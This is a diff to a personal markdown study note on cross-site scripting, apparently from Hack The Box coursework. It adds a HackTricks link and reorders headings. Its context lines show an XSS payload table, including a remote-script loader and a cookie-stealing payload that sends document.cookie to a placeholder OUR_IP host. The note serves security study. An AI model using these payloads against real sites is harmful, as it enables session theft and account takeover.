@@ -15,6 +15,10 @@ XSS vulnerabilities take advantage of a flaw in user input sanitization to "writ
 - [Google Search XSS](https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/)
 - [Apache XSS](https://infra.apache.org/blog/apache_org_04_09_2010)
 
+# Methodology
+- [HackTricks](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html#methodology)
+
+
 # XSS Testing Payloads
 | Description | Code |
 |-------------|------|
@@ -32,10 +36,6 @@ XSS vulnerabilities take advantage of a flaw in user input sanitization to "writ
 | Remove certain HTML element | `<script>document.getElementById('urlform').remove();</script>` |
 | Load remote script | `<script src="http://OUR_IP/script.js"></script>` |
 | Send Cookie details to us | `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` |
-
-# HTB Module questions
-## Cross-Site Scripting (XSS)
-## Advanced XSS and CSRF Exploitation
 
 # Notes
 ## Same-Origin Policy (SOP) 
@@ -107,8 +107,6 @@ Execution Sinks:
 
 ---
 
-
-
----
-
-
+# HTB Module questions
+## Cross-Site Scripting (XSS)
+## Advanced XSS and CSRF Exploitation
